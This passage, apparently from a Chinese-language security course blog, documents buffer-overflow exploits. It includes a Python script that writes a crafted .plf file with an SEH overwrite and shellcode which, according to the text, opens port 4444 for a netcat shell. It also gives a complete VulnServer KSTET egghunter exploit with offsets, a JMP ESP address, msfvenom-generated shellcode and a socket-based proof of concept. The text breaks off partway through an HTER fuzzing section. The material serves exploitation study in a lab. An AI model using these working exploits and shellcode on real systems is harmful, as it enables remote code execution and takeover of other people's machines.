class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">filename = <span class="string">"dvdPoc.plf"</span></span><br><span class="line"></span><br><span class="line">nseh = <span class="string">b"\xEB\x06\x90\x90"</span>  </span><br><span class="line">seh = <span class="string">b"\x2e\x17\x64\x61"</span>  </span><br><span class="line"></span><br><span class="line">buf = <span class="string">b""</span></span><br><span class="line">buf += <span class="string">b"\xda\xc4\xbb\xc7\xa0\x66\xe5\xd9\x74\x24\xf4\x5f"</span></span><br><span class="line">buf += <span class="string">b"\x33\xc9\xb1\x53\x31\x5f\x17\x83\xc7\x04\x03\x98"</span></span><br><span class="line">buf += <span class="string">b"\xb3\x84\x10\xda\x5c\xca\xdb\x22\x9d\xab\x52\xc7"</span></span><br><span class="line">buf += <span class="string">b"\xac\xeb\x01\x8c\x9f\xdb\x42\xc0\x13\x97\x07\xf0"</span></span><br><span class="line">buf += <span class="string">b"\xa0\xd5\x8f\xf7\x01\x53\xf6\x36\x91\xc8\xca\x59"</span></span><br><span class="line">buf += <span class="string">b"\x11\x13\x1f\xb9\x28\xdc\x52\xb8\x6d\x01\x9e\xe8"</span></span><br><span class="line">buf += <span class="string">b"\x26\x4d\x0d\x1c\x42\x1b\x8e\x97\x18\x8d\x96\x44"</span></span><br><span class="line">buf += <span class="string">b"\xe8\xac\xb7\xdb\x62\xf7\x17\xda\xa7\x83\x11\xc4"</span></span><br><span class="line">buf += <span class="string">b"\xa4\xae\xe8\x7f\x1e\x44\xeb\xa9\x6e\xa5\x40\x94"</span></span><br><span class="line">buf += <span class="string">b"\x5e\x54\x98\xd1\x59\x87\xef\x2b\x9a\x3a\xe8\xe8"</span></span><br><span class="line">buf += <span class="string">b"\xe0\xe0\x7d\xea\x43\x62\x25\xd6\x72\xa7\xb0\x9d"</span></span><br><span class="line">buf += <span class="string">b"\x79\x0c\xb6\xf9\x9d\x93\x1b\x72\x99\x18\x9a\x54"</span></span><br><span class="line">buf += <span class="string">b"\x2b\x5a\xb9\x70\x77\x38\xa0\x21\xdd\xef\xdd\x31"</span></span><br><span class="line">buf += <span class="string">b"\xbe\x50\x78\x3a\x53\x84\xf1\x61\x3c\x69\x38\x99"</span></span><br><span class="line">buf += <span class="string">b"\xbc\xe5\x4b\xea\x8e\xaa\xe7\x64\xa3\x23\x2e\x73"</span></span><br><span class="line">buf += <span class="string">b"\xc4\x19\x96\xeb\x3b\xa2\xe7\x22\xf8\xf6\xb7\x5c"</span></span><br><span class="line">buf += <span class="string">b"\x29\x77\x5c\x9c\xd6\xa2\xc9\x94\x71\x1d\xec\x59"</span></span><br><span class="line">buf += <span class="string">b"\xc1\xcd\xb0\xf1\xaa\x07\x3f\x2e\xca\x27\x95\x47"</span></span><br><span class="line">buf += <span class="string">b"\x63\xda\x16\x76\x28\x53\xf0\x12\xc0\x35\xaa\x8a"</span></span><br><span class="line">buf += <span class="string">b"\x22\x62\x63\x2d\x5c\x40\xdb\xd9\x15\x82\xdc\xe6"</span></span><br><span class="line">buf += <span class="string">b"\xa5\x80\x4a\x70\x2e\xc7\x4e\x61\x31\xc2\xe6\xf6"</span></span><br><span class="line">buf += <span class="string">b"\xa6\x98\x66\xb5\x57\x9c\xa2\x2d\xfb\x0f\x29\xad"</span></span><br><span class="line">buf += <span class="string">b"\x72\x2c\xe6\xfa\xd3\x82\xff\x6e\xce\xbd\xa9\x8c"</span></span><br><span class="line">buf += <span class="string">b"\x13\x5b\x91\x14\xc8\x98\x1c\x95\x9d\xa5\x3a\x85"</span></span><br><span class="line">buf += <span class="string">b"\x5b\x25\x07\xf1\x33\x70\xd1\xaf\xf5\x2a\x93\x19"</span></span><br><span class="line">buf += <span class="string">b"\xac\x81\x7d\xcd\x29\xea\xbd\x8b\x35\x27\x48\x73"</span></span><br><span class="line">buf += <span class="string">b"\x87\x9e\x0d\x8c\x28\x77\x9a\xf5\x54\xe7\x65\x2c"</span></span><br><span class="line">buf += <span class="string">b"\xdd\x07\x84\xe4\x28\xa0\x11\x6d\x91\xad\xa1\x58"</span></span><br><span class="line">buf += <span class="string">b"\xd6\xcb\x21\x68\xa7\x2f\x39\x19\xa2\x74\xfd\xf2"</span></span><br><span class="line">buf += <span class="string">b"\xde\xe5\x68\xf4\x4d\x05\xb9"</span></span><br><span class="line"></span><br><span class="line">buffer = <span class="string">b"\x41"</span> * <span class="number">608</span> + nseh + seh + <span class="string">b"\x90"</span> * <span class="number">8</span> + buf + <span class="string">b"\x90"</span> * <span class="number">8</span> + <span class="string">b"\x44"</span> * (<span class="number">1002</span> - <span class="number">608</span> - <span class="number">4</span> - <span class="number">4</span> - <span class="built_in">len</span>(buf) - <span class="number">8</span> * <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">'wb'</span>) <span class="keyword">as</span> textfile:</span><br><span class="line">    textfile.write(buffer)</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<p>运行程序导入包含 shellcode 的文件， <code>netstat -a</code>  查看端口开放情况，发现 4444 端口处于待监听状态</p>
<p><img src="/2025/01/25/%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E/Users/1/Desktop/%E6%9C%9F%E6%9C%AB%E6%9C%88/%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/%E6%96%87%E6%A1%A3/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20241212213926553.png" alt="image-20241212213926553"></p>
<p>kali nc 连接成功 getshell</p>
<p><img src="/2025/01/25/%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E/Users/1/Desktop/image-20241212214100832.png" alt="image-20241212214100832"></p>
<h2 id="基于egghunter-寻蛋猎人的漏洞分析与利用"><a class="markdownIt-Anchor" href="#基于egghunter-寻蛋猎人的漏洞分析与利用">#</a> 基于 EggHunter 寻蛋猎人的漏洞分析与利用</h2>
<h3 id="触发漏洞-2"><a class="markdownIt-Anchor" href="#触发漏洞-2">#</a> 触发漏洞</h3>
<p>创建 <code>kstet.apk</code>  文件</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s_readline(); </span><br><span class="line">s_string("KSTET "); </span><br><span class="line">s_string_variable("LEGEND");</span><br></pre></td></tr></tbody></table></figure>
<p>再运行下面指令</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">generic_send_tcp 192.168.177.136 9999 kstet.spk 0 0</span><br></pre></td></tr></tbody></table></figure>
<p>构造不同的数据包，发送给靶机的 9999 端口，会发现 VulnServer 报异常，EIP 指向不可访问地址。</p>
<p><img src="/2025/01/25/%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E/Users/1/Desktop/%E6%9C%9F%E6%9C%AB%E6%9C%88/%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/%E6%96%87%E6%A1%A3/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20241213003408614.png" alt="image-20241213003408614"></p>
<p>wireshark 可以看到此时内容为  <code>KSTET  /.:/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</code> ，考虑会不会就是这几个字符也会造成溢出，不用 5004 个字符呢，于是 nc 192.168.177.136 9999 手工连接，然后输入上述命令，发现果然也触发了漏洞溢出。</p>
<p><img src="/2025/01/25/%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E/Users/1/Desktop/%E6%9C%9F%E6%9C%AB%E6%9C%88/%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/%E6%96%87%E6%A1%A3/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20241213003931812.png" alt="image-20241213003931812"></p>
<p>考虑不一定要 5004 个字符，可以就按照当前的这个比较短的字符的做法即可。 因为二者造 成的溢出效果一样，而且都是可利用空间比较小，共 90 个字符 A，输入更多的 A 效果也是 一样的。尝试输入少一些的 A，比如 80 个，也可以溢出，但是缓存空间中的 A 会比 90 小， 所以最大就是 90 个 A 了，多了无意义。</p>
<p>分析发现此时的可利用空间比较小，因此考虑使用 Egghunter 技术。</p>
<h3 id="构建poc"><a class="markdownIt-Anchor" href="#构建poc">#</a> 构建 POC</h3>
<p>参考抓包分析到的格式，考虑消息格式可以考虑  <code>KSTET /.:/</code>  后面跟 90 个 A，因此构建 POC 如下 <code>kstetPoc.py</code></p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket  </span><br><span class="line">poc = <span class="string">b"A"</span> * <span class="number">90</span>  </span><br><span class="line">s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)  </span><br><span class="line">connect = s.connect((<span class="string">'192.168.177.136'</span>,<span class="number">9999</span>))  </span><br><span class="line">s.recv(<span class="number">1024</span>)  </span><br><span class="line">s.send(<span class="string">b'KSTET /.:/'</span> + poc +<span class="string">b'\r\n'</span>)  </span><br><span class="line">s.send(<span class="string">b'EXIT'</span> +<span class="string">b'\r\n'</span>)</span><br></pre></td></tr></tbody></table></figure>
<p>运行 poc.py 发现报错，此时 EIP= 41414141，说明存在 缓冲区溢出。</p>
<p><img src="/2025/01/25/%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E/Users/1/Desktop/%E6%9C%9F%E6%9C%AB%E6%9C%88/%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/%E6%96%87%E6%A1%A3/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20241213010052028.png" alt="image-20241213010052028"></p>
<h3 id="定位偏移"><a class="markdownIt-Anchor" href="#定位偏移">#</a> 定位偏移</h3>
<p>使用命令 <code>!mona pc 90</code>  生成长度 90 的唯一字符串</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9</span><br></pre></td></tr></tbody></table></figure>
<p>赋值给 poc，重新运行 <code>poc.py</code></p>
<p>触发异常， <code>!mona findmsp</code>  查看偏移</p>
<p><img src="/2025/01/25/%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E/Users/1/Desktop/%E6%9C%9F%E6%9C%AB%E6%9C%88/%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/%E6%96%87%E6%A1%A3/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20241213104820276.png" alt="image-20241213104820276"></p>
<p>可以看到 offset=66</p>
<p>重新设置</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">poc = <span class="string">b"A"</span> * <span class="number">66</span> +<span class="string">b"BBBB"</span> + <span class="string">b"C"</span>*(<span class="number">90</span>-<span class="number">66</span>-<span class="number">4</span>)</span><br></pre></td></tr></tbody></table></figure>
<p>重新运行  <code>kstetPoc.py</code> ，触发异常，此时 EIP=42424242，程序精准溢出。</p>
<p><img src="/2025/01/25/%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E/Users/1/Desktop/%E6%9C%9F%E6%9C%AB%E6%9C%88/%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/%E6%96%87%E6%A1%A3/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20241213105244299.png" alt="image-20241213105244299"></p>
<h3 id="坏字节分析-2"><a class="markdownIt-Anchor" href="#坏字节分析-2">#</a> 坏字节分析</h3>
<p>由于缓冲区空间只有 90 个字节，EIP 偏移为 66，所以计划将 egghunter 代码放在 EIP 的前面部分（低地址空间），在 EIP 的后面（高地址空间）放短跳指令，跳转到 egghunter 的第一条指令。</p>
<p><code>!mona ba -b "\x00"</code>  指令生成坏字节字符串</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"</span></span><br><span class="line"><span class="string">"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"</span></span><br><span class="line"><span class="string">"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"</span></span><br><span class="line"><span class="string">"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"</span></span><br><span class="line"><span class="string">"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"</span></span><br><span class="line"><span class="string">"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"</span></span><br><span class="line"><span class="string">"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"</span></span><br><span class="line"><span class="string">"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"</span></span><br></pre></td></tr></tbody></table></figure>
<p>共 254 个，将其分为每 90 个为一组，共三组： “\x01” ----“\x5a”，“\x5b”----“\xb4”，“\xb5”----“\xff”；分别将 poc 赋值为上述三组字符串，然后分别运行 <code>kstetPoc.py</code>  三次，触发异常，分析缓冲区中的字符串，发现 "\x01"----“\xff” 三次均可成功显示，所以坏字节只有一个就是 "\x00"</p>
<h3 id="基于egghunter实现程序控制流程劫持"><a class="markdownIt-Anchor" href="#基于egghunter实现程序控制流程劫持">#</a> 基于 <code>EggHunter</code>  实现程序控制流程劫持</h3>
<p>msf 工具生成 <code>egghunter</code>  或者  <code>!mona egg -t hack</code> （注意 hack 不要使用双引号，如果这样写 <code>!mona egg -t "hack"</code> , 多了双引号，格式不正确， 所以无法生成 hack 为标志的 egghunter，只能生成默认以 w00t 为标志的 egghunter）</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf-egghunter -p windows -f python -b "\x00" -e hack -v egghunter</span><br></pre></td></tr></tbody></table></figure>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">egghunter =  <span class="string">b""</span></span><br><span class="line">egghunter += <span class="string">b"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd"</span></span><br><span class="line">egghunter += <span class="string">b"\x2e\x3c\x05\x5a\x74\xef\xb8\x68\x61\x63\x6b"</span></span><br><span class="line">egghunter += <span class="string">b"\x89\xd7\xaf\x75\xea\xaf\x75\xe7\xff\xe7"</span></span><br></pre></td></tr></tbody></table></figure>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">start:</span><br><span class="line">    or dx, 0x0fff              ; 将 DX 的低 12 位设置为 1，便于对齐到下一页</span><br><span class="line">    inc edx                    ; 增加 EDX 的值，指向下一个内存地址</span><br><span class="line">    push edx                   ; 保存当前地址到堆栈</span><br><span class="line">    push 0x02                  ; 将系统调用编号（2）压栈，用于检查页面访问权限</span><br><span class="line">    pop eax                    ; 将堆栈顶的值加载到 EAX，准备系统调用参数</span><br><span class="line">    int 0x2e                   ; 调用系统中断 0x2e（Linux 或 Windows 系统调用）</span><br><span class="line"></span><br><span class="line">    cmp al, 0x05               ; 比较系统调用返回值</span><br><span class="line">                                ; 返回值为 0x05 时，表示页面可访问</span><br><span class="line">    pop edx                    ; 恢复之前保存的地址</span><br><span class="line">    je start                   ; 如果页面不可访问，跳转回开始处，继续搜索下一页</span><br><span class="line"></span><br><span class="line">    mov eax, 0x6b636168        ; 将标志 "hack"（ASCII 对应 0x6b636168）加载到 EAX</span><br><span class="line">    mov edi, edx               ; 将当前地址加载到 EDI，用作后续比较的内存地址</span><br><span class="line">    scasd                      ; 比较内存中值（ES:[EDI]）与 EAX（标志 "hack"）</span><br><span class="line">    jne start                  ; 如果不匹配，跳转回开始，继续搜索</span><br><span class="line"></span><br><span class="line">    scasd                      ; 再次比较内存值，验证连续的标志</span><br><span class="line">    jne start                  ; 如果不匹配，跳转回开始，继续搜索</span><br><span class="line"></span><br><span class="line">    jmp edi                    ; 找到匹配的标志后，跳转到目标地址并执行有效负载</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<p>这段 egghunter 汇编代码如上，即设置两个连续的标志（这里是 hackhack）然后再页面里面搜索这两个标注并跳转到目标地址</p>
<p>egghunter 指令放在覆盖的 EIP 前面，将 EIP 覆盖的修改为 JMP ESP 指令，然后将 EIP 后面的修改为短跳指令，短跳的距离最少为（32+4+2）字节（为什么是 32+4+2，egghunter 长 32 字节，EIP 指针长 4 字节，短跳指令长 2 个字节：指令编码为  <code>\xEB</code> ，后接一个 1 字节的偏移值）当然可以 38 个长，因 为可以在 egghunter 前面加 "\x90" 数据（滑板指令）</p>
<h4 id="查找jmp-esp-指令-2"><a class="markdownIt-Anchor" href="#查找jmp-esp-指令-2">#</a> 查找 jmp esp 指令</h4>
<p><code>!mona jmp -r esp</code></p>
<p><img src="/2025/01/25/%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E/Users/1/Desktop/%E6%9C%9F%E6%9C%AB%E6%9C%88/%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/%E6%96%87%E6%A1%A3/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20241213112548992.png" alt="image-20241213112548992"></p>
<p>一样的取第一个地址 <code>0x625011af</code></p>
<h4 id="设置短跳指令"><a class="markdownIt-Anchor" href="#设置短跳指令">#</a> 设置短跳指令</h4>
<p>由于是往前跳转 38 个字节，所以应该是 EB -38， -38 写成补码为 11011010==DA， 所 以指令应该是 EB DA</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">poc = <span class="string">b"\x90"</span>*(<span class="number">66</span>-<span class="built_in">len</span>(egghunter)) + egghunter + <span class="string">b"\xaf\x11\x50\x62"</span> + <span class="string">b"\xeb\xda\x90\x90"</span> + <span class="string">b"C"</span>*(<span class="number">90</span>-<span class="number">66</span>-<span class="number">4</span>-<span class="number">4</span>)</span><br></pre></td></tr></tbody></table></figure>
<p>修改 poc 赋值，<a target="_blank" rel="noopener" href="http://xn--poc-qu8fr14m2oj0ld.py">重新运行 poc.py</a>，发现程序崩溃并且返回的 <code>EIP=0x625011af</code>  程序精准溢出，继续跟踪运行，程序果然跳到了 egghunter 的第一条指令处，短跳指令也没问题</p>
<p>那么接下来就可以构造 shellcode 了</p>
<h3 id="编写shellcode-4"><a class="markdownIt-Anchor" href="#编写shellcode-4">#</a> 编写 shellcode</h3>
<p>生成一个弹出计算机的 shellcode</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/exec CMD=calc.exe -b "\x00" -f python</span><br></pre></td></tr></tbody></table></figure>
<p>buf 赋值，egg=b"hackhack"</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">buf =  <span class="string">b""</span></span><br><span class="line">buf += <span class="string">b"\xb8\xa4\x24\x99\x0e\xda\xc6\xd9\x74\x24\xf4\x5b"</span></span><br><span class="line">buf += <span class="string">b"\x29\xc9\xb1\x31\x83\xeb\xfc\x31\x43\x0f\x03\x43"</span></span><br><span class="line">buf += <span class="string">b"\xab\xc6\x6c\xf2\x5b\x84\x8f\x0b\x9b\xe9\x06\xee"</span></span><br><span class="line">buf += <span class="string">b"\xaa\x29\x7c\x7a\x9c\x99\xf6\x2e\x10\x51\x5a\xdb"</span></span><br><span class="line">buf += <span class="string">b"\xa3\x17\x73\xec\x04\x9d\xa5\xc3\x95\x8e\x96\x42"</span></span><br><span class="line">buf += <span class="string">b"\x15\xcd\xca\xa4\x24\x1e\x1f\xa4\x61\x43\xd2\xf4"</span></span><br><span class="line">buf += <span class="string">b"\x3a\x0f\x41\xe9\x4f\x45\x5a\x82\x03\x4b\xda\x77"</span></span><br><span class="line">buf += <span class="string">b"\xd3\x6a\xcb\x29\x68\x35\xcb\xc8\xbd\x4d\x42\xd3"</span></span><br><span class="line">buf += <span class="string">b"\xa2\x68\x1c\x68\x10\x06\x9f\xb8\x69\xe7\x0c\x85"</span></span><br><span class="line">buf += <span class="string">b"\x46\x1a\x4c\xc1\x60\xc5\x3b\x3b\x93\x78\x3c\xf8"</span></span><br><span class="line">buf += <span class="string">b"\xee\xa6\xc9\x1b\x48\x2c\x69\xc0\x69\xe1\xec\x83"</span></span><br><span class="line">buf += <span class="string">b"\x65\x4e\x7a\xcb\x69\x51\xaf\x67\x95\xda\x4e\xa8"</span></span><br><span class="line">buf += <span class="string">b"\x1c\x98\x74\x6c\x45\x7a\x14\x35\x23\x2d\x29\x25"</span></span><br><span class="line">buf += <span class="string">b"\x8c\x92\x8f\x2d\x20\xc6\xbd\x6f\x2e\x19\x33\x0a"</span></span><br><span class="line">buf += <span class="string">b"\x1c\x19\x4b\x15\x30\x72\x7a\x9e\xdf\x05\x83\x75"</span></span><br><span class="line">buf += <span class="string">b"\xa4\xfa\xc9\xd4\x8c\x92\x97\x8c\x8d\xfe\x27\x7b"</span></span><br><span class="line">buf += <span class="string">b"\xd1\x06\xa4\x8e\xa9\xfc\xb4\xfa\xac\xb9\x72\x16"</span></span><br><span class="line">buf += <span class="string">b"\xdc\xd2\x16\x18\x73\xd2\x32\x7b\x12\x40\xde\x52"</span></span><br><span class="line">buf += <span class="string">b"\xb1\xe0\x45\xab"</span></span><br></pre></td></tr></tbody></table></figure>
<p>调整 <code>poc.py</code>  如下</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)  </span><br><span class="line">connect = s.connect((<span class="string">'10.10.10.128'</span>,<span class="number">9999</span>))  </span><br><span class="line">s.send(<span class="string">b'STATS /.:/'</span> + egg+<span class="string">b"\x90"</span>*<span class="number">50</span>+buf +<span class="string">b'\r\n'</span>)  </span><br><span class="line">s.recv(<span class="number">1024</span>)  </span><br><span class="line">s.send(<span class="string">b'EXIT'</span> +<span class="string">b'\r\n'</span>) </span><br><span class="line">s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)  </span><br><span class="line">connect = s.connect((<span class="string">'192.168.177.'</span>,<span class="number">9999</span>))  </span><br><span class="line">s.send(<span class="string">b'KSTET /.:/'</span> + poc +<span class="string">b'\r\n'</span>)  </span><br><span class="line">s.recv(<span class="number">1024</span>)  </span><br><span class="line">s.send(<span class="string">b'EXIT'</span> +<span class="string">b'\r\n'</span>)  </span><br><span class="line">s.close()</span><br></pre></td></tr></tbody></table></figure>
<p>再开启服务器，运行 <code>poc.py</code></p>
<p><img src="/2025/01/25/%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E/Users/1/Desktop/%E6%9C%9F%E6%9C%AB%E6%9C%88/%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/%E6%96%87%E6%A1%A3/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20241213120519483.png" alt="image-20241213120519483"></p>
<p>可以看到成功弹出了计算器</p>
<h2 id="十六进制和unicode编码下的漏洞利用"><a class="markdownIt-Anchor" href="#十六进制和unicode编码下的漏洞利用">#</a> 十六进制和 Unicode 编码下的漏洞利用</h2>
<h3 id="触发漏洞-3"><a class="markdownIt-Anchor" href="#触发漏洞-3">#</a> 触发漏洞</h3>
<p>模糊测试 <code>HTER</code>  命令 — 编写模糊测试脚本程序  <code>hter.spk</code>  如下</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s_readline();  </span><br><span class="line">s_string("HTER ");  </span><br><span class="line">s_string_variable("LEGEND"); </span><br></pre></td></tr></tbody></table></figure>
<p>运行如下指令</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">generic_send_tcp 192.168.177.136 9999 hter.spk 0 0</span><br></pre></td></tr></tbody></table></figure>
<p>程序崩溃，分析 wireshark 抓到的包</p>
<p><img src="/2025/01/25/%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E/Users/1/Desktop/%E6%9C%9F%E6%9C%AB%E6%9C%88/%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/%E6%96%87%E6%A1%A3/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20241214004336604.png" alt="image-20241214004336604"></p>
<p>第 826 个包的 <code>Reset:Set</code>  代表终止连接，那么就是前面的输入导致了程序崩溃往前找到很多 AAA 输入的包，发现是有 2048 个 A，即可确定 size 的值为 2049</p>
<h4 id="构造poc验证"><a class="markdownIt-Anchor" href="#构造poc验证">#</a> 构造 poc 验证</h4>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket  </span><br><span class="line">poc = <span class="string">b"\x41"</span> * <span class="number">2049</span>  </span><br><span class="line">s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)  </span><br><span class="line">connect = s.connect((<span class="string">'192.168.177.136'</span>,<span class="number">9999</span>))  </span><br><span class="line">s.recv(<span class="number">1024</span>)  </span><br><span class="line">s.send(<span class="string">b'HTER '</span> + poc +<span class="string">b'\r\n'</span>)  </span><br><span class="line">s.send(<span class="string">b'EXIT'</span> +<span class="string">b'\r\n'</span>) </span><br></pre></td></tr></tbody></table></figure>
<p>构造 poc 如上，运行，程序报错，此时 EIP 确实是 <code>AAAAAAAA</code></p>
<p><img src="/2025/01/25/%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E/Users/1/Desktop/%E6%9C%9F%E6%9C%AB%E6%9C%88/%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/%E6%96%87%E6%A1%A3/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20241214005023334.png" alt="image-20241214005023334"></p>
